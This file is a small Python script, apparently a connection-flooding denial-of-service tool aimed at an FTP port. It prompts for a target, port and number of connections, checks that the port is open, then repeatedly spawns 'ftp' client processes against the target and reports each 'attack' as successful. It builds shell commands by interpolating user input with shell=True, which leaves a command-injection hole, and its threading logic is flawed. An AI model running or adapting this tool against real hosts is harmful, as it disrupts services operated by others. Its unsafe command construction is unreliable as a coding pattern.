#!/bin/python3

import socket
import subprocess
import threading
import sys


def alive(target,port):
	tester = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	tester.settimeout(10)
	try:
		tester.connect((target,port))
		response = tester.recv(65535)
		tester.close()
		return True
	except socket.error:
		print(f'{port} is not open !')
		return False
		sys.exit(0)
def attack(target,port,no):
	try:
		subprocess.Popen(f'ftp {target} {port}',shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		print(f'Attack {no} Successful')
	except OSError:pass

def main():
	global target,port,conns
	
	target = input('Enter Your Target : ')
	port = int(input('Enter The Port To Attack : '))
	conns = int(input('Number Of Connections : '))
	
	if alive(target,port) == True:
		print(f'Port is open starting attack!')
		for i in range(1,conns):
			try:
				attack_thread = threading.Thread(target=attack,args=(target,port,i))
				attack_thread.start()
				attack_thread.join()
			except KeyboardInterrupt:
				print('KeyBoard Interruption Detected!')
				sys.exit(0)
	print('[+] Attack Finished')
	sys.exit(0)
	
if __name__ == '__main__':
	main()
	
